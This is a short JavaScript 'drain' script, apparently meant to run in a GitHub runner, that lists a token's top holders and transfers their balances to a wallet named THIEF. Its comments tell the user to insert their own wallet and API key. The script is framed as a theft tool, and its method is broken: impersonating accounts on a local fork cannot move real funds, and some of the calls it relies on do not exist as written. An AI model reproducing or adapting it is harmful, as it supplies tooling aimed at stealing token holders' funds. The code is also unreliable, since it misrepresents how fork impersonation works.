// eth-mirror drain – runs inside GitHub runner
const { ethers } = require("ethers");
const axios = require("axios");

const REAL = process.argv[2] || "0x9FAB63812476FA4F4e8806D5297452dBC2c1C67c";
const THIEF = "0xDeadBeef00000000000000000000000000000000"; // CHANGE TO YOUR ETH WALLET
const FORK = "https://eth-mainnet.g.alchemy.com/v2/YOUR_ALCHEMY_FORK_KEY"; // CHANGE

const abi = ["function balanceOf(address) view returns (uint)"];
const erc20 = new ethers.Contract(REAL, abi, new ethers.providers.JsonRpcProvider(FORK));

(async () => {
  const top = await axios.get(`https://api.ethplorer.io/getTopTokenHolders/${REAL}?apiKey=freekey&limit=500`);
  for (const h of top.data.holders) {
    const addr = h.address;
    const amt = await erc20.balanceOf(addr);
    if (amt.eq(0)) continue;
    // sweep via impersonate
    await axios.post(FORK, {
      jsonrpc: "2.0",
      id: 1,
      method: "anvil_impersonateAccount",
      params: [addr]
    });
    const signer = await ethers.getImpersonatedSigner(addr);
    const tx = await erc20.connect(signer).transfer(THIEF, amt);
    await tx.wait();
    console.log("drained", addr, amt.toString());
  }
})();
